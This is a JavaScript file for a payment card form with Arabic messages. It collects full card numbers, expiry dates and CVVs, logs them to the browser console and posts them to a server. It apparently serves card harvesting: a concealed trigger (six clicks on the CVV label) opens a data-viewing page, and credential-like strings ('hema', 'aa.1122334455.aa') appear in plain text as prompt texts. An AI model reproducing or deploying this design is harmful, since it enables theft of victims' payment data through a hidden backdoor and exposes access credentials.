document.addEventListener('DOMContentLoaded', () => {
    const cardNumberInput = document.getElementById('card-number');
    const cardIcons = document.getElementById('card-icons');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const countrySelect = document.getElementById('country');
    const amountInput = document.getElementById('amount');
    const currencyInput = document.getElementById('currency');
    const cvvLabel = document.querySelector('label[for="cvv"]');
    
    let cvvClickCount = 0;

    const cardPatterns = {
        '4': { type: 'Visa', length: 16, icon: 'images/Visa Logo.png' },
        '5': { type: 'MasterCard', length: 16, icon: 'images/MasterCard Logo.jpg' },
        '3': { type: 'American Express', length: 15, icon: 'images/American Express Logo.jpg' },
        '6': { type: 'Discover', length: 16, icon: 'images/Discover Logo.jpg' }
    };
    
    const formatCardNumber = (value) => {
        let cleanedValue = value.replace(/\D/g, '');
        let cardType = cardPatterns[cleanedValue[0]];
        let length = cardType ? cardType.length : 16;

        if (cleanedValue.length > length) {
            cleanedValue = cleanedValue.slice(0, length);
        }

        let formattedValue = cleanedValue.match(/.{1,4}/g);
        return formattedValue ? formattedValue.join(' ') : '';
    };

    cardNumberInput.addEventListener('input', () => {
        const cardNumber = cardNumberInput.value;
        cardNumberInput.value = formatCardNumber(cardNumber);

        const cleanedValue = cardNumber.replace(/\D/g, '');
        const cardType = cardPatterns[cleanedValue[0]];

        if (cardType) {
            cardIcons.innerHTML = `<img src="${cardType.icon}" alt="${cardType.type}" width="40">`;
            cvvInput.maxLength = cardType.type === 'American Express' ? '4' : '3';
        } else {
            cardIcons.innerHTML = '';
            cvvInput.maxLength = '3';
        }
    });

    expiryDateInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        e.target.value = value;
    });

    countrySelect.addEventListener('change', () => {
        const selectedOption = countrySelect.options[countrySelect.selectedIndex];
        const currency = selectedOption.getAttribute('data-currency');
        currencyInput.value = currency;
    });

    document.getElementById('payment-form').addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = {
            name: document.getElementById('card-name').value,
            card_number: document.getElementById('card-number').value,
            expiry_date: document.getElementById('expiry-date').value,
            cvv: document.getElementById('cvv').value,
            country: document.getElementById('country').value,
            amount: document.getElementById('amount').value,
            currency: document.getElementById('currency').value
        };
        console.log('بيانات النموذج:', formData);
        alert('تم إرسال المبلغ سيتم مرجع الطلب');

        fetch('/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
        })
        .catch(error => {
            console.error('Error:', error);
        });
    });

    const viewData = () => {
        const userId = prompt('hema');
        const password = prompt('aa.1122334455.aa');
        
        if (!userId || !password) {
            alert('يرجى إدخال رقم المستخدم وكلمة المرور');
            return;
        }

        fetch('/view-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ userId, password })
        })
        .then(response => {
            if (response.status === 401) {
                alert('رقم المستخدم أو كلمة المرور غير صحيحة');
                throw new Error('Unauthorized');
            }
            if (response.status === 400) {
                alert('يرجى إدخال رقم المستخدم وكلمة المرور');
                throw new Error('Bad Request');
            }
            return response.json();
        })
        .then(data => {
            console.log(data);
            alert(JSON.stringify(data, null, 2));
        })
        .catch(error => {
            console.error('Error:', error);
        });
    };

    document.getElementById('view-data').addEventListener('click', viewData);

    cvvLabel.addEventListener('click', () => {
        cvvClickCount++;
        if (cvvClickCount === 6) {
            window.location.href = 'view-data.html';
            cvvClickCount = 0; // Reset count
        }
    });
});
